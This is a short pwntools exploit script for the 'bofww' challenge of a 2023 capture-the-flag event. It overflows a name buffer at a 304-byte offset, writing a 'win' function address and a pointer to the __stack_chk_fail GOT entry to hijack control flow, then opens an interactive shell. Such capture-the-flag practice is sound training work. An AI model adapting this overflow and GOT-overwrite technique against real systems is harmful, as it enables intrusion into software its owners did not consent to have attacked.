from pwn import *

elf_path = './bofww'
elf = ELF(elf_path)
io = process(elf_path)
#io = remote('bofww.2023.cakectf.com', 9002)

# addr offset: 304

payload = p64(elf.symbols['_Z3winv'])
payload += b'a' * (304 - len(payload))
payload += p64(elf.got['__stack_chk_fail'])
payload += b'a' * 64

io.sendlineafter('name? ', payload)
io.sendlineafter('you? ', b'1')

io.interactive()
